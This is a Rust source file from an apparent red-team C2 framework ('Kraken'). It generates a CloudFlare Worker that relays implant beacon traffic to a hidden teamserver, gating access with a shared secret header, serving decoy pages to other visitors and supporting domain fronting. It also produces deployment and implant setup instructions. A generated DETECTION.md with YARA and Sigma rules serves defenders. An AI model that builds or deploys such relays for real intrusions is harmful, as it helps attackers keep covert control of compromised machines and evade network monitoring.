//! CloudFlare Workers CDN Redirector
//!
//! Generates CloudFlare Workers deployment configuration for CDN-based
//! C2 traffic relay. This enables domain fronting through CloudFlare's
//! global CDN infrastructure.
//!
//! # Architecture
//!
//! ```text
//! Implant → CloudFlare CDN → Worker (relay) → Teamserver
//!           (legit domain)   (filter+proxy)   (hidden backend)
//! ```
//!
//! # Detection Indicators
//! - Host header differs from SNI/connection hostname
//! - Unusual User-Agent patterns from CDN edge IPs
//! - POST requests with encoded body to legitimate-looking domains
//! - Consistent request timing patterns through CDN
//!
//! # MITRE ATT&CK
//! - T1090.004 (Proxy: Domain Fronting)
//! - T1071.001 (Application Layer Protocol: Web Protocols)

use anyhow::Result;
use clap::Args;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::Path;

/// Arguments for CloudFlare Worker generation
#[derive(Debug, Args)]
pub struct CloudflareWorkerArgs {
    /// Backend teamserver URL (e.g., https://ts.example.com:8443)
    #[arg(long, short = 'b')]
    pub backend_url: String,

    /// Secret header name for request validation
    #[arg(long, default_value = "X-Request-ID")]
    pub secret_header: String,

    /// Secret header value (shared secret between implant and worker)
    #[arg(long)]
    pub secret_value: String,

    /// Allowed URI paths (comma-separated, e.g., "/api/v1,/update,/check")
    #[arg(long, default_value = "/api/v1/beacon,/api/v1/task")]
    pub allowed_paths: String,

    /// Worker name for wrangler deployment
    #[arg(long, default_value = "cdn-relay")]
    pub worker_name: String,

    /// CloudFlare account ID
    #[arg(long)]
    pub account_id: Option<String>,

    /// Custom route pattern (e.g., "example.com/*")
    #[arg(long)]
    pub route: Option<String>,

    /// Output directory for generated files
    #[arg(long, short = 'o', default_value = "./cf-worker")]
    pub output_dir: String,

    /// Enable request body transformation (base64 decode)
    #[arg(long)]
    pub transform_body: bool,

    /// Decoy response HTML for invalid requests
    #[arg(long)]
    pub decoy_url: Option<String>,
}

/// CloudFlare Worker configuration
#[derive(Debug, Serialize, Deserialize)]
pub struct WorkerConfig {
    pub name: String,
    pub main: String,
    pub compatibility_date: String,
    pub account_id: Option<String>,
    pub routes: Vec<RouteConfig>,
    pub vars: WorkerVars,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct RouteConfig {
    pub pattern: String,
    pub zone_name: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct WorkerVars {
    #[serde(rename = "BACKEND_URL")]
    pub backend_url: String,
    #[serde(rename = "SECRET_HEADER")]
    pub secret_header: String,
    #[serde(rename = "SECRET_VALUE")]
    pub secret_value: String,
    #[serde(rename = "ALLOWED_PATHS")]
    pub allowed_paths: String,
}

/// Generate CloudFlare Worker deployment files
pub fn generate_cloudflare_worker(args: CloudflareWorkerArgs) -> Result<()> {
    let output_path = Path::new(&args.output_dir);
    fs::create_dir_all(output_path)?;

    // Generate the Worker TypeScript code
    let worker_code = generate_worker_code(&args);
    fs::write(output_path.join("src").join("index.ts").as_path(), "")?;
    fs::create_dir_all(output_path.join("src"))?;
    fs::write(output_path.join("src").join("index.ts"), &worker_code)?;

    // Generate wrangler.toml
    let wrangler_config = generate_wrangler_config(&args);
    fs::write(output_path.join("wrangler.toml"), &wrangler_config)?;

    // Generate package.json
    let package_json = generate_package_json(&args.worker_name);
    fs::write(output_path.join("package.json"), &package_json)?;

    // Generate deployment instructions
    let readme = generate_deployment_readme(&args);
    fs::write(output_path.join("README.md"), &readme)?;

    // Generate detection documentation
    let detection_doc = generate_detection_doc(&args);
    fs::write(output_path.join("DETECTION.md"), &detection_doc)?;

    println!("[+] CloudFlare Worker files generated in: {}", args.output_dir);
    println!("    - src/index.ts     (Worker code)");
    println!("    - wrangler.toml    (Wrangler config)");
    println!("    - package.json     (Dependencies)");
    println!("    - README.md        (Deployment guide)");
    println!("    - DETECTION.md     (Detection indicators)");
    println!();
    println!("[*] Deploy with:");
    println!("    cd {} && npm install && wrangler deploy", args.output_dir);

    Ok(())
}

fn generate_worker_code(args: &CloudflareWorkerArgs) -> String {
    let transform_body_code = if args.transform_body {
        r#"
    // Decode base64 body if transformation enabled
    if (request.method === 'POST') {
      const body = await request.text();
      try {
        const decoded = atob(body);
        modifiedRequest = new Request(backendUrl, {
          method: request.method,
          headers: modifiedHeaders,
          body: decoded,
        });
      } catch {
        modifiedRequest = new Request(backendUrl, {
          method: request.method,
          headers: modifiedHeaders,
          body: body,
        });
      }
    } else {
      modifiedRequest = new Request(backendUrl, {
        method: request.method,
        headers: modifiedHeaders,
      });
    }"#
    } else {
        r#"
    // Forward request body as-is
    modifiedRequest = new Request(backendUrl, {
      method: request.method,
      headers: modifiedHeaders,
      body: request.body,
    });"#
    };

    let decoy_response = if let Some(ref url) = args.decoy_url {
        format!(
            r#"
  // Fetch decoy content for invalid requests
  const decoyResponse = await fetch('{}');
  return new Response(decoyResponse.body, {{
    status: 200,
    headers: {{ 'Content-Type': 'text/html' }},
  }});"#,
            url
        )
    } else {
        r#"
  // Return generic 404 for invalid requests
  return new Response('Not Found', { status: 404 });"#
            .to_string()
    };

    format!(
        r#"/**
 * Kraken C2 CloudFlare Worker Relay
 *
 * This worker acts as a CDN-based traffic relay, forwarding valid
 * C2 traffic to the backend teamserver while serving decoy content
 * for invalid requests.
 *
 * Detection Indicators:
 * - Host header mismatch with connection hostname
 * - Consistent request patterns to this worker's route
 * - POST requests with specific header patterns
 *
 * MITRE ATT&CK: T1090.004 (Domain Fronting)
 */

export interface Env {{
  BACKEND_URL: string;
  SECRET_HEADER: string;
  SECRET_VALUE: string;
  ALLOWED_PATHS: string;
}}

export default {{
  async fetch(request: Request, env: Env, ctx: ExecutionContext): Promise<Response> {{
    const url = new URL(request.url);
    const path = url.pathname;

    // Validate secret header
    const secretHeader = request.headers.get(env.SECRET_HEADER);
    if (secretHeader !== env.SECRET_VALUE) {{
      console.log(`Invalid secret header from ${{request.headers.get('CF-Connecting-IP')}}`);
      {}
    }}

    // Validate path is allowed
    const allowedPaths = env.ALLOWED_PATHS.split(',').map(p => p.trim());
    if (!allowedPaths.some(allowed => path.startsWith(allowed))) {{
      console.log(`Invalid path: ${{path}}`);
      {}
    }}

    // Build backend URL
    const backendUrl = new URL(path + url.search, env.BACKEND_URL);

    // Forward headers, removing CF-specific ones
    const modifiedHeaders = new Headers();
    for (const [key, value] of request.headers.entries()) {{
      // Skip CloudFlare-specific headers
      if (!key.toLowerCase().startsWith('cf-') && key.toLowerCase() !== 'host') {{
        modifiedHeaders.set(key, value);
      }}
    }}

    // Add X-Forwarded-For for logging
    const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
    modifiedHeaders.set('X-Forwarded-For', clientIP);
    modifiedHeaders.set('X-Real-IP', clientIP);

    let modifiedRequest: Request;
    {}

    try {{
      // Forward to backend
      const response = await fetch(modifiedRequest);

      // Return response with CORS headers if needed
      const modifiedResponse = new Response(response.body, {{
        status: response.status,
        statusText: response.statusText,
        headers: response.headers,
      }});

      return modifiedResponse;
    }} catch (error) {{
      console.error(`Backend error: ${{error}}`);
      return new Response('Service Unavailable', {{ status: 503 }});
    }}
  }},
}};
"#,
        decoy_response, decoy_response, transform_body_code
    )
}

fn generate_wrangler_config(args: &CloudflareWorkerArgs) -> String {
    let account_id = args
        .account_id
        .as_ref()
        .map(|id| format!("account_id = \"{}\"", id))
        .unwrap_or_else(|| "# account_id = \"your-account-id\"".to_string());

    let route_config = args
        .route
        .as_ref()
        .map(|r| {
            format!(
                r#"
routes = [
  {{ pattern = "{}", custom_domain = true }}
]"#,
                r
            )
        })
        .unwrap_or_default();

    format!(
        r#"# Kraken C2 CloudFlare Worker Configuration
# Deploy with: wrangler deploy

name = "{}"
main = "src/index.ts"
compatibility_date = "2024-01-01"
{}
{}

[vars]
BACKEND_URL = "{}"
SECRET_HEADER = "{}"
SECRET_VALUE = "{}"
ALLOWED_PATHS = "{}"

# Uncomment to enable custom domain routing
# [routes]
# pattern = "example.com/*"
# zone_name = "example.com"
"#,
        args.worker_name,
        account_id,
        route_config,
        args.backend_url,
        args.secret_header,
        args.secret_value,
        args.allowed_paths
    )
}

fn generate_package_json(name: &str) -> String {
    format!(
        r#"{{
  "name": "{}",
  "version": "1.0.0",
  "private": true,
  "scripts": {{
    "deploy": "wrangler deploy",
    "dev": "wrangler dev",
    "tail": "wrangler tail"
  }},
  "devDependencies": {{
    "@cloudflare/workers-types": "^4.20240117.0",
    "typescript": "^5.0.0",
    "wrangler": "^3.0.0"
  }}
}}
"#,
        name
    )
}

fn generate_deployment_readme(args: &CloudflareWorkerArgs) -> String {
    format!(
        r#"# Kraken CloudFlare Worker Redirector

CDN-based traffic relay using CloudFlare Workers for C2 communication.

## Prerequisites

1. CloudFlare account with Workers enabled
2. Wrangler CLI: `npm install -g wrangler`
3. Authenticated: `wrangler login`

## Configuration

Edit `wrangler.toml` to set:
- `account_id`: Your CloudFlare account ID
- `BACKEND_URL`: Teamserver URL ({})
- `SECRET_HEADER`: Validation header name ({})
- `SECRET_VALUE`: Shared secret value
- `ALLOWED_PATHS`: Comma-separated allowed URI paths

## Deployment

```bash
# Install dependencies
npm install

# Test locally
wrangler dev

# Deploy to CloudFlare
wrangler deploy
```

## Implant Configuration

Configure implant to:
1. Connect to the Worker URL (e.g., `https://cdn-relay.your-account.workers.dev`)
2. Include header: `{}: {}`
3. Use allowed paths: `{}`

## Custom Domain (Domain Fronting)

For domain fronting, add a route in `wrangler.toml`:
```toml
routes = [
  {{ pattern = "legitimate-domain.com/api/*", custom_domain = true }}
]
```

Then configure implant to:
- Connect to: `legitimate-domain.com`
- Host header: `cdn-relay.your-account.workers.dev`

## Security Considerations

- Rotate `SECRET_VALUE` periodically
- Monitor Worker logs for anomalies
- Consider IP allowlisting for backend

## Detection

See `DETECTION.md` for indicators defenders can use to identify this traffic.
"#,
        args.backend_url,
        args.secret_header,
        args.secret_header,
        args.secret_value,
        args.allowed_paths
    )
}

fn generate_detection_doc(args: &CloudflareWorkerArgs) -> String {
    format!(
        r#"# Detection Indicators for CloudFlare Worker Relay

This document provides detection guidance for defenders.

## MITRE ATT&CK

- **T1090.004**: Proxy: Domain Fronting
- **T1071.001**: Application Layer Protocol: Web Protocols
- **T1572**: Protocol Tunneling

## Network Indicators

### CloudFlare Edge IP Ranges

Traffic originates from CloudFlare edge servers. Check source IPs against:
- https://www.cloudflare.com/ips/

### Request Patterns

| Indicator | Description |
|-----------|-------------|
| Consistent timing | Regular beacon intervals (jittered but patterned) |
| POST to static-looking paths | `/api/v1/beacon`, `/api/v1/task` |
| Custom headers | Look for unusual header: `{}` |
| Encoded body | Base64 or custom encoding in POST body |
| User-Agent anomalies | Static or unusual UA string |

### Domain Fronting Indicators

| Indicator | Description |
|-----------|-------------|
| SNI/Host mismatch | TLS SNI differs from HTTP Host header |
| CF-Connecting-IP header | Original client IP in logs |
| X-Forwarded-For chain | Proxy chain visible |

## Endpoint Indicators

- Process making HTTPS requests to CloudFlare IPs
- Consistent outbound connections on :443
- Certificate pinning to CloudFlare edge certs

## Log Analysis

### CloudFlare Access Logs

Look for patterns in:
- Request paths: `{}`
- Request timing clusters
- Geographic anomalies (implant location vs expected users)

### Firewall Logs

- Outbound 443 to CloudFlare IP ranges
- High request volume to single Worker endpoint

## YARA Rules

```yara
rule CloudFlare_Worker_C2_Config {{
    meta:
        description = "Detects CloudFlare Worker C2 relay configuration"
        mitre = "T1090.004"

    strings:
        $header = "{}" ascii wide
        $path1 = "/api/v1/beacon" ascii wide
        $path2 = "/api/v1/task" ascii wide
        $worker = "workers.dev" ascii wide

    condition:
        2 of them
}}
```

## Sigma Rules

```yaml
title: CloudFlare Worker C2 Communication
status: experimental
logsource:
    category: proxy
detection:
    selection:
        cs-host|endswith: '.workers.dev'
        cs-method: 'POST'
    filter:
        cs-uri-path|startswith:
            - '/api/v1/'
    condition: selection and filter
level: medium
```

## Mitigation Recommendations

1. **Block Worker subdomains** if not business-required
2. **Inspect POST bodies** for encoded payloads
3. **Monitor beacon timing** with statistical analysis
4. **Alert on new Worker endpoints** accessed by internal hosts
"#,
        args.secret_header, args.allowed_paths, args.secret_header
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_worker_code_generation() {
        let args = CloudflareWorkerArgs {
            backend_url: "https://ts.example.com:8443".into(),
            secret_header: "X-Request-ID".into(),
            secret_value: "secret123".into(),
            allowed_paths: "/api/v1/beacon,/api/v1/task".into(),
            worker_name: "test-worker".into(),
            account_id: None,
            route: None,
            output_dir: "/tmp/test".into(),
            transform_body: false,
            decoy_url: None,
        };

        let code = generate_worker_code(&args);
        assert!(code.contains("BACKEND_URL"));
        assert!(code.contains("SECRET_HEADER"));
        assert!(code.contains("fetch"));
    }

    #[test]
    fn test_wrangler_config_generation() {
        let args = CloudflareWorkerArgs {
            backend_url: "https://ts.example.com:8443".into(),
            secret_header: "X-Request-ID".into(),
            secret_value: "secret123".into(),
            allowed_paths: "/api/v1/beacon".into(),
            worker_name: "cdn-relay".into(),
            account_id: Some("abc123".into()),
            route: Some("example.com/*".into()),
            output_dir: "/tmp/test".into(),
            transform_body: false,
            decoy_url: None,
        };

        let config = generate_wrangler_config(&args);
        assert!(config.contains("cdn-relay"));
        assert!(config.contains("abc123"));
        assert!(config.contains("example.com/*"));
    }

    #[test]
    fn test_package_json_generation() {
        let pkg = generate_package_json("test-worker");
        assert!(pkg.contains("test-worker"));
        assert!(pkg.contains("wrangler"));
        assert!(pkg.contains("typescript"));
    }
}
